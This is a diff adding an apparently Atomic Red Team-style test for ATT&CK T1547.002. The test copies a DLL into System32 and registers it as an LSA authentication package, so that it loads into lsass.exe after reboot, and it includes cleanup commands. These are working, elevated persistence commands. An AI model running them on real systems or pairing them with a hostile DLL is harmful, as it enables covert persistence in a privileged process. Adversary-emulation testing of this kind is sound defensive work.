@@ -1,0 +1,21 @@
+attack_technique: T1547.002
+display_name: Authentication Package
+atomic_tests:
+- name: Authentication Package
+  auto_generated_guid: be2590e8-4ac3-47ac-b4b5-945820f2fbe9
+  description: |
+    Establishes persistence using a custom authentication package for the Local Security Authority (LSA).
+    After a reboot, Notepad.exe will be executed as child process of lsass.exe.
+    Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package
+    [Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Copy-Item $PathToAtomicsFolder\T1547.002\bin\package.dll C:\Windows\System32\
+      reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f
+    cleanup_command: |
+      reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
+      rm -force C:\windows\system32\package.dll
+    name: powershell
+    elevation_required: true
